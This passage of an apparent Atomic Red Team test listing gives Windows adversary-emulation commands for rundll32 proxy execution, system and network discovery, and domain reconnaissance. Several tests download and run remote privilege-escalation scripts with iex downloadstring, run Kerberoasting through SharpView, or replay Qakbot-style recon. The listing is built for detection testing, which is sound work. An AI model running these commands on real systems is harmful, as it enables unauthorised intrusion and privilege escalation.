Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll" -OutFile "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Signed Binary Proxy Execution: Rundll32 T1218.011
Atomic Test Name: Rundll32 with desk.cpl
Atomic Test Number: 13
Atomic Test GUID: 83a95136-a496-423c-81d3-1c6750133917
Description: Rundll32.exe loading an executable renamed as .scr using desk.cpl  Reference:    - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/) SIG
MA rules:   - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)   - [Run
dll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_in
stallscreensaver.yml)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
copy #{exe_to_launch} not_an_scr.scr
rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
Command (with inputs):
copy %windir%\System32\calc.exe not_an_scr.scr
rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr

Cleanup Commands:
Command:
del not_an_scr.scr
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: System Information Discovery
Atomic Test Number: 1
Atomic Test GUID: 66703791-c902-4560-8770-42b8a91f7667
Description: Identify System Info. Upon execution, system info and time info will be displayed.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Hostname Discovery (Windows)
Atomic Test Number: 6
Atomic Test GUID: 85cfbf23-4a1e-4342-8792-007e004b975f
Description: Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
hostname
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Windows MachineGUID Discovery
Atomic Test Number: 8
Atomic Test GUID: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
Description: Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Griffon Recon
Atomic Test Number: 9
Atomic Test GUID: 69bd4abe-8759-49a6-8d21-0f15822d6370
Description: This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre  in order simply print the recon results to the
 screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).   For more information see also [https://malpedia.caad.fk
ie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S04
17/)

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cscript "#{vbscript}"
Command (with inputs):
cscript "C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs"

Dependencies:
Description: Sample script file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs)
Check Prereq Command:
if (Test-Path "#{vbscript}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{vbscript}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Environment variables discovery on windows
Atomic Test Number: 10
Atomic Test GUID: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
Description: Identify all environment variables. Upon execution, environments variables and your path info will be displayed.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
set
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - winPEAS
Atomic Test Number: 13
Atomic Test GUID: eea1d918-825e-47dd-acc2-814d6c58c0e1
Description: Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - itm4nprivesc
Atomic Test Number: 14
Atomic Test GUID: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
Description: Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - Powersploits privesc checks
Atomic Test Number: 15
Atomic Test GUID: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
Description: Powersploits privesc checks using oldchecks function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput

Cleanup Commands:
Command:
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - General privesc checks
Atomic Test Number: 16
Atomic Test GUID: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
Description: General privesc checks using the otherchecks function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - GeneralRecon
Atomic Test Number: 17
Atomic Test GUID: 7804659b-fdbf-4cf6-b06a-c03e758590e8
Description: Collect general computer informations via GeneralRecon function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - Morerecon
Atomic Test Number: 18
Atomic Test GUID: 3278b2f6-f733-4875-9ef4-bfed34244f0a
Description: Gathers local system information using the Morerecon function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - RBCD-Check
Atomic Test Number: 19
Atomic Test GUID: dec6a0d8-bcaf-4c22-9d48-2aee59fb692b
Description: Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
Atomic Test Number: 20
Atomic Test GUID: 07b18a66-6304-47d2-bad0-ef421eb2e107
Description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
Atomic Test Number: 21
Atomic Test GUID: efb79454-1101-4224-a4d0-30c9c8b29ffc
Description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command "audit"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - PowerSharpPack - Seatbelt
Atomic Test Number: 22
Atomic Test GUID: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
Description: PowerSharpPack - Seatbelt technique via function of WinPwn.
[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive s
ecurity perspectives.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command "-group=all"; pause
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Azure Security Scan with SkyArk
Atomic Test Number: 23
Atomic Test GUID: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
Description: Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tena
nt, as well as identify any admin users.  Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered user
s.  See https://github.com/cyberark/SkyArk

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      
$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
Connect-AzAccount -Credential $Credential
Connect-AzureAD -Credential $Credential
Scan-AzureAdmins -UseCurrentCred
Command (with inputs):
Import-Module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AzureStealth.ps1" -force      
$Password = ConvertTo-SecureString -String "T1082Az" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "", $Password
Connect-AzAccount -Credential $Credential
Connect-AzureAD -Credential $Credential
Scan-AzureAdmins -UseCurrentCred

Cleanup Commands:
Command:
$resultstime = Get-Date -Format "yyyyMMdd"
$resultsfolder = ("Results-" + $resultstime)
remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue

Dependencies:
Description: The SkyArk AzureStealth module must exist in C:\AtomicRedTeam\atomics\..\ExternalPayloads.
Check Prereq Command:
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AzureStealth.ps1"){exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "PathToAtomicsFolder\..\External
Payloads\AzureStealth.ps1"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "C:\AtomicRedTeam\atomics\..\Ext
ernalPayloads\AzureStealth.ps1"
Description: The AzureAD module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name AzureAD -Force
Description: The Az module must be installed.
Check Prereq Command:
try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
Get Prereq Command:
Install-Module -Name Az -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: System Information Discovery with WMIC
Atomic Test Number: 25
Atomic Test GUID: 8851b73a-3624-4bf7-8704-aa312411565c
Description: Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk dri
ve names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions. https://nwgat.ninja/getting-system-information-with-wmic-on-windows/ Elements of
 this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting: https://blog.sekoia.io/aurora-a-rising-stealer-flying-und
er-the-radar https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Driver Enumeration using DriverQuery
Atomic Test Number: 26
Atomic Test GUID: bd85e3d1-4aeb-4a1d-850f-7be3cb8d60b9
Description: Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be used for Exploitation.  c
ommand /v - provide verbose output but not valid for signed drivers         /si - provide information about signed drivers

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
driverquery /v
driverquery /si
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: System Information Discovery
Atomic Test Number: 27
Atomic Test GUID: 4060ee98-01ae-4c8e-8aad-af8300519cc7
Description: The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in 
c:\Windows\System32\config or c:\Windows\System32\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: Check computer location
Atomic Test Number: 28
Atomic Test GUID: 96be6002-9200-47db-94cb-c3e27de1cb36
Description: Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed. - https://tria.ge/210111-eaz8mqhgh6/behavioral1

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: BIOS Information Discovery through Registry
Atomic Test Number: 29
Atomic Test GUID: f2f91612-d904-49d7-87c2-6c165d23bead
Description: Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displ
ayed. - https://tria.ge/210111-eaz8mqhgh6/behavioral1 - https://evasions.checkpoint.com/techniques/registry.html

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: System Network Configuration Discovery on Windows
Atomic Test Number: 1
Atomic Test GUID: 970ab6a1-0157-4f3f-9a73-ec4166754b23
Description: Identify network configuration information
Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
ipconfig /all
netsh interface show interface
arp -a
nbtstat -n
net config
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: List Windows Firewall Rules
Atomic Test Number: 2
Atomic Test GUID: 038263cb-00f4-4b0a-98ae-0696c67e1752
Description: Enumerates Windows Firewall Rules using netsh.
Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
netsh advfirewall firewall show rule name=all
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: System Network Configuration Discovery (TrickBot Style)
Atomic Test Number: 4
Atomic Test GUID: dafaf052-5508-402d-bf77-51e0700c02e2
Description: Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/
Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: List Open Egress Ports
Atomic Test Number: 5
Atomic Test GUID: 4b467538-f102-491d-ace7-ed487b853bf5
Description: This is to test for what ports are open outbound.  The technique used was taken from the following blog: https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-e
gress-testing-with-allports-exposed/
Upon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\open-ports.txt.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$ports = Get-content "#{port_file}"
$file = "#{output_file}"
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = "$port open" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = "$port closed" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = "There were a total of $totalopen open ports out of $totalports ports tested."
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
Command (with inputs):
$ports = Get-content "C:\AtomicRedTeam\atomics\T1016\src\top-128.txt"
$file = "$env:USERPROFILE\Desktop\open-ports.txt"
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = "$port open" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = "$port closed" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = "There were a total of $totalopen open ports out of $totalports ports tested."
$results | Out-File -Encoding ASCII -append $file
Write-Host $results

Cleanup Commands:
Command:
Remove-Item -ErrorAction ignore "#{output_file}"
Command (with inputs):
Remove-Item -ErrorAction ignore "$env:USERPROFILE\Desktop\open-ports.txt"

Dependencies:
Description: Test requires C:\AtomicRedTeam\atomics\T1016\src\top-128.txt to exist
Check Prereq Command:
if (Test-Path "#{port_file}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1016\src\top-128.txt") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{port_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1016\src\top-128.txt") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt" -OutFile "C:\AtomicRedTeam\atomics\T1016\src\top-128.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: Adfind - Enumerate Active Directory Subnet Objects
Atomic Test Number: 6
Atomic Test GUID: 9bb45dd7-c466-4f93-83a1-be30e56033ee
Description: Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet 
Objects reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=subnet)
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe" -f (objectcategory=subnet)

Dependencies:
Description: AdFind.exe must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe)
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"

[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: Qakbot Recon
Atomic Test Number: 7
Atomic Test GUID: 121de5c6-5818-4868-b8a7-8fd07c455c1b
Description: A list of commands known to be performed by Qakbot for recon purposes

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"#{recon_commands}"
Command (with inputs):
"C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"

Dependencies:
Description: File to copy must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat)
Check Prereq Command:
if (Test-Path "#{recon_commands}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{recon_commands}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat" -OutFile "#{recon_commands}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat" -OutFile "C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Configuration Discovery T1016
Atomic Test Name: DNS Server Discovery Using nslookup
Atomic Test Number: 9
Atomic Test GUID: 34557863-344a-468f-808b-a1bfb89b4fa9
Description: Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain controlle
r of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: System Network Connections Discovery T1049
Atomic Test Name: System Network Connections Discovery
Atomic Test Number: 1
Atomic Test GUID: 0940a971-809a-48f1-9c4d-b1d785e96ee5
Description: Get a listing of network connections.
Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
netstat
net use
net sessions
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Connections Discovery T1049
Atomic Test Name: System Network Connections Discovery with PowerShell
Atomic Test Number: 2
Atomic Test GUID: f069f0f1-baad-4831-aa2b-eddac4baac4a
Description: Get a listing of network connections.
Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Get-NetTCPConnection
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Network Connections Discovery T1049
Atomic Test Name: System Discovery using SharpView
Atomic Test Number: 4
Atomic Test GUID: 96f974bb-a0da-4d87-a744-ff33e73367e9
Description: Get a listing of network connections, domains, domain users, and etc.   sharpview.exe located in the bin folder, an opensource red-team tool. Upon successful execution, 
cmd.exe will execute sharpview.exe <method>. Results will output via stdout.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$syntaxList = #{syntax}
foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}
Command (with inputs):
$syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare" 

foreach ($syntax in $syntaxList) {
C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpView.exe $syntax -}

Dependencies:
Description: Sharpview.exe must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpView.exe)
Check Prereq Command:
if (Test-Path "#{SharpView}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpView.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{SharpView}") -ErrorAction ignore | Out-Null
Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SharpView.exe") -ErrorAction ignore | Out-Null
